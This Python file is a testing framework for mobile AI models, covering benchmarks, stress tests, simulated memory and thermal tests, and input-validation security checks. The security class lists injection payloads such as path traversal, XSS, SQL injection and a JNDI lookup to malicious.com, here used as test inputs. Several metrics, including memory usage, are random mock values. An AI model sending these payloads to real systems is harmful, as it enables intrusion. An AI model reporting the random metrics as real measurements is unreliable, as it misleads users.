"""Advanced testing framework for mobile AI systems."""

import time
import asyncio
import random
import logging
import threading
import tempfile
import os
from typing import Dict, List, Optional, Any, Callable, Union
from dataclasses import dataclass
from enum import Enum
import json
import numpy as np

logger = logging.getLogger(__name__)


class TestType(Enum):
    """Types of tests supported."""
    UNIT = "unit"
    INTEGRATION = "integration"
    PERFORMANCE = "performance"
    SECURITY = "security"
    RESILIENCE = "resilience"
    MOBILE_SPECIFIC = "mobile_specific"
    CHAOS = "chaos"


@dataclass
class TestResult:
    """Test result data structure."""
    test_name: str
    test_type: TestType
    passed: bool
    duration_ms: float
    metrics: Dict[str, Any]
    errors: List[str]
    warnings: List[str]
    timestamp: float


class PerformanceBenchmark:
    """Performance benchmarking for mobile AI operations."""
    
    def __init__(self):
        self.benchmark_results = {}
        self.baseline_metrics = {}
        
    def run_inference_benchmark(self, model, test_data: List[np.ndarray], 
                               iterations: int = 100) -> Dict[str, Any]:
        """Benchmark inference performance."""
        benchmark_start = time.time()
        
        results = {
            "total_iterations": iterations,
            "latencies_ms": [],
            "memory_usage_mb": [],
            "throughput_fps": 0,
            "errors": 0
        }
        
        try:
            # Warm-up runs
            for _ in range(5):
                try:
                    if hasattr(model, 'generate_caption'):
                        _ = model.generate_caption(test_data[0])
                except:
                    pass
            
            # Actual benchmark
            successful_runs = 0
            
            for i in range(iterations):
                test_image = test_data[i % len(test_data)]
                
                # Measure latency
                start_time = time.time()
                try:
                    if hasattr(model, 'generate_caption'):
                        result = model.generate_caption(test_image)
                        latency_ms = (time.time() - start_time) * 1000
                        results["latencies_ms"].append(latency_ms)
                        successful_runs += 1
                    else:
                        # Mock benchmark for testing
                        time.sleep(0.01)  # Simulate 10ms inference
                        latency_ms = random.uniform(8, 15)
                        results["latencies_ms"].append(latency_ms)
                        successful_runs += 1
                        
                except Exception as e:
                    results["errors"] += 1
                    logger.warning(f"Benchmark iteration {i} failed: {e}")
                
                # Mock memory measurement
                memory_mb = random.uniform(200, 400)
                results["memory_usage_mb"].append(memory_mb)
            
            # Calculate aggregate metrics
            if results["latencies_ms"]:
                total_time = (time.time() - benchmark_start)
                results["throughput_fps"] = successful_runs / total_time
                results["avg_latency_ms"] = sum(results["latencies_ms"]) / len(results["latencies_ms"])
                results["min_latency_ms"] = min(results["latencies_ms"])
                results["max_latency_ms"] = max(results["latencies_ms"])
                results["p95_latency_ms"] = np.percentile(results["latencies_ms"], 95)
                results["p99_latency_ms"] = np.percentile(results["latencies_ms"], 99)
                
                results["avg_memory_mb"] = sum(results["memory_usage_mb"]) / len(results["memory_usage_mb"])
                results["peak_memory_mb"] = max(results["memory_usage_mb"])
                
                results["success_rate"] = successful_runs / iterations
            
            return results
            
        except Exception as e:
            logger.error(f"Benchmark failed: {e}")
            return {"error": str(e), "iterations": iterations}
    
    def run_stress_test(self, model, duration_seconds: int = 60, 
                       concurrent_requests: int = 10) -> Dict[str, Any]:
        """Run stress test with concurrent requests."""
        stress_results = {
            "duration_seconds": duration_seconds,
            "concurrent_requests": concurrent_requests,
            "total_requests": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "avg_latency_ms": 0,
            "max_latency_ms": 0,
            "errors": []
        }
        
        # Generate test data
        test_image = np.random.randint(0, 255, (224, 224, 3), dtype=np.uint8)
        
        start_time = time.time()
        latencies = []
        errors = []
        request_count = 0
        
        def worker():
            nonlocal request_count, latencies, errors
            
            while time.time() - start_time < duration_seconds:
                try:
                    worker_start = time.time()
                    
                    if hasattr(model, 'generate_caption'):
                        result = model.generate_caption(test_image)
                    else:
                        # Mock operation
                        time.sleep(random.uniform(0.01, 0.05))
                        result = "mock_result"
                    
                    latency_ms = (time.time() - worker_start) * 1000
                    latencies.append(latency_ms)
                    request_count += 1
                    
                except Exception as e:
                    errors.append(str(e))
                
                # Small delay to avoid overwhelming
                time.sleep(0.001)
        
        # Start concurrent workers
        threads = []
        for _ in range(concurrent_requests):
            thread = threading.Thread(target=worker)
            thread.start()
            threads.append(thread)
        
        # Wait for completion
        for thread in threads:
            thread.join()
        
        # Calculate results
        stress_results["total_requests"] = request_count
        stress_results["successful_requests"] = len(latencies)
        stress_results["failed_requests"] = len(errors)
        stress_results["errors"] = errors[:10]  # Keep only first 10 errors
        
        if latencies:
            stress_results["avg_latency_ms"] = sum(latencies) / len(latencies)
            stress_results["max_latency_ms"] = max(latencies)
            stress_results["min_latency_ms"] = min(latencies)
            stress_results["requests_per_second"] = len(latencies) / duration_seconds
        
        return stress_results
    
    def compare_with_baseline(self, current_results: Dict[str, Any], 
                            baseline_name: str) -> Dict[str, Any]:
        """Compare current results with baseline."""
        if baseline_name not in self.baseline_metrics:
            return {"error": f"Baseline {baseline_name} not found"}
        
        baseline = self.baseline_metrics[baseline_name]
        comparison = {
            "baseline_name": baseline_name,
            "improvements": {},
            "regressions": {},
            "overall_score": 100
        }
        
        # Compare key metrics
        comparisons = {
            "avg_latency_ms": "lower_is_better",
            "throughput_fps": "higher_is_better",
            "avg_memory_mb": "lower_is_better",
            "success_rate": "higher_is_better"
        }
        
        for metric, direction in comparisons.items():
            if metric in current_results and metric in baseline:
                current_val = current_results[metric]
                baseline_val = baseline[metric]
                
                if direction == "lower_is_better":
                    change_percent = ((current_val - baseline_val) / baseline_val) * 100
                    if change_percent < -5:  # 5% improvement threshold
                        comparison["improvements"][metric] = {
                            "current": current_val,
                            "baseline": baseline_val,
                            "improvement_percent": abs(change_percent)
                        }
                    elif change_percent > 10:  # 10% regression threshold
                        comparison["regressions"][metric] = {
                            "current": current_val,
                            "baseline": baseline_val,
                            "regression_percent": change_percent
                        }
                        comparison["overall_score"] -= 20
                
                else:  # higher_is_better
                    change_percent = ((current_val - baseline_val) / baseline_val) * 100
                    if change_percent > 5:  # 5% improvement threshold
                        comparison["improvements"][metric] = {
                            "current": current_val,
                            "baseline": baseline_val,
                            "improvement_percent": change_percent
                        }
                    elif change_percent < -10:  # 10% regression threshold
                        comparison["regressions"][metric] = {
                            "current": current_val,
                            "baseline": baseline_val,
                            "regression_percent": abs(change_percent)
                        }
                        comparison["overall_score"] -= 20
        
        return comparison
    
    def save_baseline(self, results: Dict[str, Any], baseline_name: str):
        """Save results as baseline for future comparisons."""
        self.baseline_metrics[baseline_name] = results.copy()
        logger.info(f"Saved baseline: {baseline_name}")


class SecurityTester:
    """Security testing for mobile AI systems."""
    
    def __init__(self):
        self.attack_patterns = [
            "../../../../etc/passwd",
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "${jndi:ldap://malicious.com/a}",
            "{{7*7}}",
            "%0Ainjected_header: value",
            "../../../windows/system32/cmd.exe"
        ]
    
    def test_input_validation(self, model) -> TestResult:
        """Test input validation security."""
        test_start = time.time()
        errors = []
        warnings = []
        vulnerabilities = []
        
        try:
            # Test malicious text inputs
            for pattern in self.attack_patterns:
                try:
                    if hasattr(model, 'answer_question'):
                        # Test with malicious question
                        test_image = np.random.randint(0, 255, (224, 224, 3), dtype=np.uint8)
                        result = model.answer_question(test_image, pattern)
                        
                        # Check if malicious pattern appears in output
                        if pattern in str(result):
                            vulnerabilities.append(f"Injection vulnerability: {pattern}")
                    
                except Exception as e:
                    # Exceptions are good - they mean the input was rejected
                    if "blocked" not in str(e).lower() and "invalid" not in str(e).lower():
                        warnings.append(f"Unexpected error for pattern {pattern}: {e}")
            
            # Test oversized inputs
            try:
                huge_input = "A" * 1000000  # 1MB string
                if hasattr(model, 'answer_question'):
                    test_image = np.random.randint(0, 255, (224, 224, 3), dtype=np.uint8)
                    result = model.answer_question(test_image, huge_input)
                    warnings.append("Large input was not rejected")
            except Exception:
                pass  # Expected to fail
            
            # Test malformed image data
            try:
                malformed_image = np.random.randint(0, 255, (10000, 10000, 3), dtype=np.uint8)
                if hasattr(model, 'generate_caption'):
                    result = model.generate_caption(malformed_image)
                    warnings.append("Oversized image was not rejected")
            except Exception:
                pass  # Expected to fail
            
            duration_ms = (time.time() - test_start) * 1000
            
            return TestResult(
                test_name="input_validation_security",
                test_type=TestType.SECURITY,
                passed=len(vulnerabilities) == 0,
                duration_ms=duration_ms,
                metrics={
                    "patterns_tested": len(self.attack_patterns),
                    "vulnerabilities_found": len(vulnerabilities),
                    "vulnerabilities": vulnerabilities
                },
                errors=errors,
                warnings=warnings,
                timestamp=time.time()
            )
            
        except Exception as e:
            return TestResult(
                test_name="input_validation_security",
                test_type=TestType.SECURITY,
                passed=False,
                duration_ms=(time.time() - test_start) * 1000,
                metrics={},
                errors=[str(e)],
                warnings=warnings,
                timestamp=time.time()
            )
    
    def test_model_integrity(self, model) -> TestResult:
        """Test model integrity and tampering detection."""
        test_start = time.time()
        errors = []
        warnings = []
        
        try:
            # Test model info retrieval
            if hasattr(model, 'get_model_info'):
                model_info = model.get_model_info()
                
                # Check for expected security features
                security_features = []
                if model_info.get('mock_mode'):
                    security_features.append("mock_mode_protection")
                
                # Check for model validation
                if hasattr(model, '_validate_model_file'):
                    security_features.append("model_file_validation")
                
                duration_ms = (time.time() - test_start) * 1000
                
                return TestResult(
                    test_name="model_integrity",
                    test_type=TestType.SECURITY,
                    passed=True,
                    duration_ms=duration_ms,
                    metrics={
                        "security_features": security_features,
                        "model_info_accessible": True
                    },
                    errors=errors,
                    warnings=warnings,
                    timestamp=time.time()
                )
            else:
                warnings.append("Model info not accessible")
                
                return TestResult(
                    test_name="model_integrity",
                    test_type=TestType.SECURITY,
                    passed=False,
                    duration_ms=(time.time() - test_start) * 1000,
                    metrics={},
                    errors=["Model info method not available"],
                    warnings=warnings,
                    timestamp=time.time()
                )
                
        except Exception as e:
            return TestResult(
                test_name="model_integrity",
                test_type=TestType.SECURITY,
                passed=False,
                duration_ms=(time.time() - test_start) * 1000,
                metrics={},
                errors=[str(e)],
                warnings=warnings,
                timestamp=time.time()
            )


class MobileTester:
    """Mobile-specific testing scenarios."""
    
    def __init__(self):
        self.device_profiles = {
            "low_end": {"memory_mb": 512, "cpu_cores": 2, "thermal_limit": 60},
            "mid_range": {"memory_mb": 1024, "cpu_cores": 4, "thermal_limit": 70},
            "high_end": {"memory_mb": 2048, "cpu_cores": 8, "thermal_limit": 80}
        }
    
    def test_memory_constraints(self, model, device_profile: str = "low_end") -> TestResult:
        """Test model behavior under memory constraints."""
        test_start = time.time()
        errors = []
        warnings = []
        
        profile = self.device_profiles.get(device_profile, self.device_profiles["low_end"])
        
        try:
            # Simulate memory pressure
            memory_results = {
                "peak_memory_mb": 0,
                "avg_memory_mb": 0,
                "memory_leaks": False,
                "oom_errors": 0
            }
            
            initial_memory = 200  # Mock initial memory usage
            memory_readings = [initial_memory]
            
            # Run multiple inference operations
            test_image = np.random.randint(0, 255, (224, 224, 3), dtype=np.uint8)
            
            for i in range(20):
                try:
                    if hasattr(model, 'generate_caption'):
                        result = model.generate_caption(test_image)
                    
                    # Mock memory measurement
                    current_memory = initial_memory + random.uniform(-10, 30)  # Some variance
                    memory_readings.append(current_memory)
                    
                    if current_memory > profile["memory_mb"]:
                        warnings.append(f"Memory usage exceeded device limit at iteration {i}")
                        
                except MemoryError:
                    memory_results["oom_errors"] += 1
                    errors.append(f"Out of memory at iteration {i}")
                except Exception as e:
                    errors.append(f"Error at iteration {i}: {e}")
            
            # Analyze memory usage
            memory_results["peak_memory_mb"] = max(memory_readings)
            memory_results["avg_memory_mb"] = sum(memory_readings) / len(memory_readings)
            
            # Check for memory leaks (simplified)
            if len(memory_readings) > 10:
                early_avg = sum(memory_readings[:5]) / 5
                late_avg = sum(memory_readings[-5:]) / 5
                if late_avg > early_avg * 1.2:  # 20% increase indicates potential leak
                    memory_results["memory_leaks"] = True
                    warnings.append("Potential memory leak detected")
            
            duration_ms = (time.time() - test_start) * 1000
            
            return TestResult(
                test_name=f"memory_constraints_{device_profile}",
                test_type=TestType.MOBILE_SPECIFIC,
                passed=memory_results["peak_memory_mb"] <= profile["memory_mb"] and not memory_results["memory_leaks"],
                duration_ms=duration_ms,
                metrics=memory_results,
                errors=errors,
                warnings=warnings,
                timestamp=time.time()
            )
            
        except Exception as e:
            return TestResult(
                test_name=f"memory_constraints_{device_profile}",
                test_type=TestType.MOBILE_SPECIFIC,
                passed=False,
                duration_ms=(time.time() - test_start) * 1000,
                metrics={},
                errors=[str(e)],
                warnings=warnings,
                timestamp=time.time()
            )
    
    def test_thermal_throttling(self, model) -> TestResult:
        """Test model behavior under thermal throttling."""
        test_start = time.time()
        errors = []
        warnings = []
        
        try:
            # Simulate thermal throttling scenario
            thermal_results = {
                "performance_degradation": False,
                "thermal_shutdowns": 0,
                "adaptive_behavior": False
            }
            
            test_image = np.random.randint(0, 255, (224, 224, 3), dtype=np.uint8)
            baseline_latency = None
            
            # Run inference under "thermal pressure"
            for temperature in [40, 50, 60, 70, 80]:  # Simulated temperature increase
                try:
                    start_time = time.time()
                    
                    if hasattr(model, 'generate_caption'):
                        result = model.generate_caption(test_image)
                    else:
                        # Mock inference with thermal simulation
                        if temperature > 70:
                            time.sleep(0.05)  # Simulate slower inference due to throttling
                        else:
                            time.sleep(0.02)
                    
                    latency = (time.time() - start_time) * 1000
                    
                    if baseline_latency is None:
                        baseline_latency = latency
                    elif latency > baseline_latency * 1.5:  # 50% slowdown
                        thermal_results["performance_degradation"] = True
                        
                        # Check if model adapts (e.g., reduces quality)
                        if hasattr(model, 'optimize_for_device'):
                            adaptation = model.optimize_for_device("edge")
                            if adaptation.get("status") == "optimized":
                                thermal_results["adaptive_behavior"] = True
                    
                    if temperature > 85:  # Critical temperature
                        thermal_results["thermal_shutdowns"] += 1
                        
                except Exception as e:
                    if "thermal" in str(e).lower() or "temperature" in str(e).lower():
                        thermal_results["thermal_shutdowns"] += 1
                    else:
                        errors.append(f"Error at {temperature}°C: {e}")
            
            duration_ms = (time.time() - test_start) * 1000
            
            return TestResult(
                test_name="thermal_throttling",
                test_type=TestType.MOBILE_SPECIFIC,
                passed=thermal_results["thermal_shutdowns"] == 0,
                duration_ms=duration_ms,
                metrics=thermal_results,
                errors=errors,
                warnings=warnings,
                timestamp=time.time()
            )
            
        except Exception as e:
            return TestResult(
                test_name="thermal_throttling",
                test_type=TestType.MOBILE_SPECIFIC,
                passed=False,
                duration_ms=(time.time() - test_start) * 1000,
                metrics={},
                errors=[str(e)],
                warnings=warnings,
                timestamp=time.time()
            )


class ComprehensiveTestSuite:
    """Comprehensive test suite for mobile AI systems."""
    
    def __init__(self):
        self.performance_benchmark = PerformanceBenchmark()
        self.security_tester = SecurityTester()
        self.mobile_tester = MobileTester()
        self.test_results = []
        
    def run_full_test_suite(self, model) -> Dict[str, Any]:
        """Run comprehensive test suite."""
        suite_start = time.time()
        
        print("🧪 Running Comprehensive Mobile AI Test Suite...")
        
        # Generate test data
        test_images = [
            np.random.randint(0, 255, (224, 224, 3), dtype=np.uint8)
            for _ in range(10)
        ]
        
        test_results = []
        
        # Performance Tests
        print("  📊 Running Performance Tests...")
        try:
            perf_results = self.performance_benchmark.run_inference_benchmark(model, test_images, 50)
            test_results.append(TestResult(
                test_name="performance_benchmark",
                test_type=TestType.PERFORMANCE,
                passed=perf_results.get("avg_latency_ms", 1000) < 100,  # Under 100ms
                duration_ms=perf_results.get("benchmark_duration_ms", 0),
                metrics=perf_results,
                errors=[],
                warnings=[],
                timestamp=time.time()
            ))
        except Exception as e:
            logger.error(f"Performance test failed: {e}")
        
        # Stress Test
        print("  🔥 Running Stress Test...")
        try:
            stress_results = self.performance_benchmark.run_stress_test(model, duration_seconds=10, concurrent_requests=5)
            test_results.append(TestResult(
                test_name="stress_test",
                test_type=TestType.PERFORMANCE,
                passed=stress_results.get("failed_requests", 0) < stress_results.get("total_requests", 1) * 0.1,
                duration_ms=stress_results.get("duration_seconds", 0) * 1000,
                metrics=stress_results,
                errors=[],
                warnings=[],
                timestamp=time.time()
            ))
        except Exception as e:
            logger.error(f"Stress test failed: {e}")
        
        # Security Tests
        print("  🔒 Running Security Tests...")
        test_results.append(self.security_tester.test_input_validation(model))
        test_results.append(self.security_tester.test_model_integrity(model))
        
        # Mobile-Specific Tests
        print("  📱 Running Mobile-Specific Tests...")
        for profile in ["low_end", "mid_range", "high_end"]:
            test_results.append(self.mobile_tester.test_memory_constraints(model, profile))
        
        test_results.append(self.mobile_tester.test_thermal_throttling(model))
        
        # Store results
        self.test_results.extend(test_results)
        
        # Generate summary
        total_tests = len(test_results)
        passed_tests = len([r for r in test_results if r.passed])
        total_duration = (time.time() - suite_start) * 1000
        
        summary = {
            "total_tests": total_tests,
            "passed_tests": passed_tests,
            "failed_tests": total_tests - passed_tests,
            "success_rate": (passed_tests / total_tests) * 100 if total_tests > 0 else 0,
            "total_duration_ms": total_duration,
            "test_results": [
                {
                    "name": r.test_name,
                    "type": r.test_type.value,
                    "passed": r.passed,
                    "duration_ms": r.duration_ms,
                    "error_count": len(r.errors),
                    "warning_count": len(r.warnings)
                }
                for r in test_results
            ]
        }
        
        print(f"✅ Test Suite Complete: {passed_tests}/{total_tests} tests passed ({summary['success_rate']:.1f}%)")
        
        return summary
    
    def generate_test_report(self) -> str:
        """Generate detailed test report."""
        if not self.test_results:
            return "No test results available"
        
        report = ["# Mobile AI Test Report", ""]
        report.append(f"**Generated:** {time.strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"**Total Tests:** {len(self.test_results)}")
        
        # Summary by test type
        by_type = {}
        for result in self.test_results:
            test_type = result.test_type.value
            if test_type not in by_type:
                by_type[test_type] = {"total": 0, "passed": 0}
            by_type[test_type]["total"] += 1
            if result.passed:
                by_type[test_type]["passed"] += 1
        
        report.append("\n## Summary by Test Type")
        for test_type, stats in by_type.items():
            success_rate = (stats["passed"] / stats["total"]) * 100
            report.append(f"- **{test_type.title()}:** {stats['passed']}/{stats['total']} ({success_rate:.1f}%)")
        
        # Detailed results
        report.append("\n## Detailed Results")
        for result in self.test_results:
            status = "✅ PASS" if result.passed else "❌ FAIL"
            report.append(f"\n### {result.test_name} - {status}")
            report.append(f"- **Type:** {result.test_type.value}")
            report.append(f"- **Duration:** {result.duration_ms:.1f}ms")
            
            if result.errors:
                report.append(f"- **Errors:** {len(result.errors)}")
                for error in result.errors[:3]:  # Show first 3 errors
                    report.append(f"  - {error}")
            
            if result.warnings:
                report.append(f"- **Warnings:** {len(result.warnings)}")
                for warning in result.warnings[:3]:  # Show first 3 warnings
                    report.append(f"  - {warning}")
            
            if result.metrics:
                report.append("- **Key Metrics:**")
                for key, value in list(result.metrics.items())[:5]:  # Show first 5 metrics
                    report.append(f"  - {key}: {value}")
        
        return "\n".join(report)


# Example usage
if __name__ == "__main__":
    print("Testing Advanced Testing Framework...")
    
    # Mock model for testing
    class MockModel:
        def generate_caption(self, image):
            time.sleep(0.01)  # Simulate inference time
            return "Mock caption for testing"
        
        def answer_question(self, image, question):
            if "<script>" in question:
                raise ValueError("Invalid input detected")
            return f"Mock answer for: {question}"
        
        def get_model_info(self):
            return {"mock_mode": True, "architecture": "test"}
        
        def optimize_for_device(self, profile):
            return {"status": "optimized", "profile": profile}
    
    # Run tests
    test_suite = ComprehensiveTestSuite()
    mock_model = MockModel()
    
    results = test_suite.run_full_test_suite(mock_model)
    print(f"Test Results: {results['success_rate']:.1f}% success rate")
    
    # Generate report
    report = test_suite.generate_test_report()
    print(f"Report generated ({len(report)} characters)")
    
    print("✅ Advanced testing framework working correctly!")